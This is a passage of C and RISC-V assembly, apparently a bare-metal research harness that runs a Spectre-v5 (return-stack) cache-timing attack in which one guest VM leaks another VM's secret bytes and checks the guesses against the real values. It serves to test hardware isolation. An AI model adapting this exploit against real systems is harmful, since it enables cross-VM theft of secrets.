  init_pmp();
  asm volatile("csrw mtvec, %0" :: "r"((uintptr_t)m_trap_entry) : "memory");
  asm volatile("csrw medeleg, zero\ncsrw mideleg, zero" ::: "memory");
  asm volatile("li t0, -1\ncsrw mcounteren, t0\ncsrw hcounteren, t0\ncsrw scounteren, t0" ::: "t0", "memory");
  install_vmid_page_tables();
  observed_attacker_hgatp = switch_hgatp(attacker_space.hgatp, 1);
  observed_attacker_vsatp = switch_vsatp(attacker_space.satp, 1);
  asm volatile("mv %0, sp" : "=r"(saved_main_m_sp));

  asm volatile("csrr %0, mstatus" : "=r"(mstatus));
  mstatus = (mstatus & ~(MSTATUS_MPP_MASK | MSTATUS_MPV | MSTATUS_MPRV_BIT)) |
            MSTATUS_MPV | MSTATUS_FS | (1ull << 11);
#if SMOKE_TRACE
  printf("[vs] pre h=%lx vs=%lx\n", observed_attacker_hgatp,
         observed_attacker_vsatp);
#endif

  asm volatile(
      "csrw mscratch, %[machine_sp]\n"
      "mv sp, %[user_sp]\n"
      "csrs vsstatus, %[vsstatus_fs]\n"
      "csrw mstatus, %[mstatus]\n"
      "csrw mepc, %[entry]\n"
      "mret\n"
      ".globl machine_low_return\n"
      "machine_low_return:\n"
      "la t0, saved_main_m_sp\n"
      "ld sp, 0(t0)\n"
      :
      : [machine_sp] "r"(machine_sp),
        [user_sp] "r"(user_sp),
        [vsstatus_fs] "r"(MSTATUS_FS),
        [mstatus] "r"(mstatus),
        [entry] "r"((uintptr_t)attacker_entry)
      : "t0", "memory");
}

int main(void)
{
  for (uint64_t i = 0; i < PROBE_ENTRIES; ++i)
    shared_probe[i * PROBE_STRIDE] = 1;

#if SMOKE_FAST_BOOT
  uint64_t measured_threshold = CACHE_HIT_THRESHOLD;
  active_threshold = CACHE_HIT_THRESHOLD;
#else
  uint64_t measured_threshold = xs_calibrate_threshold(shared_probe, PROBE_STRIDE);
  active_threshold = measured_threshold;
#if USE_FIXED_CACHE_HIT_THRESHOLD
  active_threshold = CACHE_HIT_THRESHOLD;
#else
  if (active_threshold == 0)
    active_threshold = CACHE_HIT_THRESHOLD;
#endif
#endif

#if !SMOKE_FAST_BOOT
  printf("[v5-vs-sv48] model=sv48-vmid-vs-frontend-ras-isolation attacker=VS victim=VS service=machine-hypervisor-scheduler hgatp_mode=bare attacker_vmid=%lu victim_vmid=%lu normalized_attacker_vmid=%lu normalized_victim_vmid=%lu fence_on_switch=%d secret_sz=%d candidates=%d flush_lines=%d control_only=%d ras_fill=%d\n",
         (uint64_t)ATTACKER_VMID, (uint64_t)VICTIM_VMID,
         (uint64_t)VMID14(ATTACKER_VMID), (uint64_t)VMID14(VICTIM_VMID),
         FENCE_ON_VMID_SWITCH, SECRET_SZ,
         PROBE_CANDIDATES, FLUSH_LINES, CONTROL_ONLY);
  printf("[v5-vs-sv48] secret_offset=%d\n", SECRET_OFFSET);
  printf("[v5-vs-sv48] calibration fallback=%d measured=%lu threshold=%lu fixed=%d\n",
         CACHE_HIT_THRESHOLD, measured_threshold, active_threshold,
         USE_FIXED_CACHE_HIT_THRESHOLD);
  printf("[v5-vs-sv48] isolation attacker_direct_victim_secret=expect-fault shared_probe=mapped-both victim_data=mapped-victim-vm-only hgatp_mode=bare hgatp_vmid=on\n");
  printf("[v5-vs-sv48] victim_array1=%p victim_secret=%p v5_gadget=%p probe=%p\n",
         victim_region.array1, victim_region.secret,
         xs_v5_recursive_ret_probe,
         shared_probe);
#endif

  enter_attacker_process();
  attack_done = 0;

#if SMOKE_FAST_BOOT
  printf("[vs] done s=%d t=%lu b=%lu c=%lu n=%d\n",
         attack_status, trap_count, bad_trap_count, last_mcause, SECRET_SZ);
  for (uint64_t i = 0; i < SECRET_SZ; ++i) {
    printf("[vs] b%lu e=%02x g=%02x gs=%lu s2=%02x s2s=%lu r=%lu\n",
           i, (uint8_t)victim_region.secret[SECRET_OFFSET + i],
           leaked_idx[i][0], leaked_score[i][0],
           leaked_idx[i][1], leaked_score[i][1], rounds_used[i]);
  }
  return 0;
#endif

  printf("[v5-vs-sv48] isolation VS-direct-victim-read fault_seen=%lu completed=%lu value=0x%02lx\n",
         direct_victim_fault_seen, direct_victim_read_completed,
         direct_victim_read_value & 0xfful);
  printf("[v5-vs-sv48] ranges u_text=[%p,%p) a_data=[%p,%p)\n",
         __u_text_start, __u_text_end,
         __a_data_start, __a_data_end);
  printf("[v5-vs-sv48] ranges shared=[%p,%p) v_data=[%p,%p)\n",
         __shared_data_start, __shared_data_end,
         __v_data_start, __v_data_end);
  printf("[v5-vs-sv48] vsatp requested_attacker=0x%lx requested_victim=0x%lx observed_attacker=0x%lx observed_victim=0x%lx mode=sv48\n",
         attacker_space.satp, victim_space.satp,
         observed_attacker_vsatp, observed_victim_vsatp);
  printf("[v5-vs-sv48] hgatp requested_attacker=0x%lx requested_victim=0x%lx observed_attacker=0x%lx observed_victim=0x%lx vmid_mask=0x%lx mode=bare\n",
         attacker_space.hgatp, victim_space.hgatp,
         observed_attacker_hgatp, observed_victim_hgatp, HGATP_VMID_MASK);
  printf("[v5-vs-sv48] traps=%lu victim_calls=%lu victim_done=%lu flush_calls=%lu exit_calls=%lu bad_traps=%lu last_mcause=%lu last_mepc=%p status=%d\n",
         trap_count, victim_call_count, victim_done_count, flush_call_count,
         exit_call_count, bad_trap_count, last_mcause, (void *)last_mepc,
         attack_status);

  int leak_ok = 1;
  for (uint64_t i = 0; i < SECRET_SZ; ++i) {
    uint8_t guess = leaked_idx[i][0];
    uint8_t second = leaked_idx[i][1];
    uint8_t expected = victim_region.secret[SECRET_OFFSET + i];
    printf("[v5-vs-sv48] byte %lu: expected=%c(0x%02x) guess=%c(0x%02x) score=%lu second=%c(0x%02x) score=%lu\n",
           i,
           expected, expected,
           (guess >= 32 && guess < 127) ? guess : '?', guess, leaked_score[i][0],
           (second >= 32 && second < 127) ? second : '?', second, leaked_score[i][1]);
    printf("[v5-vs-sv48] byte %lu rounds=%lu v5_rounds=%d early_stop=%d min_score=%d gap=%d\n",
           i, rounds_used[i], V5_ROUNDS, EARLY_STOP, EARLY_STOP_MIN_SCORE, EARLY_STOP_GAP);
    (void)second;
    if (guess != expected)
      leak_ok = 0;
  }

  int isolation_ok = direct_victim_fault_seen != 0 &&
                     direct_victim_read_completed == 0 &&
                     ((observed_attacker_hgatp & HGATP_VMID_MASK) !=
                      (observed_victim_hgatp & HGATP_VMID_MASK));
  int pass = (attack_status == 0 && bad_trap_count == 0 &&
              victim_call_count != 0 && victim_done_count == victim_call_count &&
              isolation_ok && leak_ok);
  printf("[v5-vs-sv48] check=%s\n", pass ? "PASS" : "FAIL");
  return pass ? 0 : 1;
}
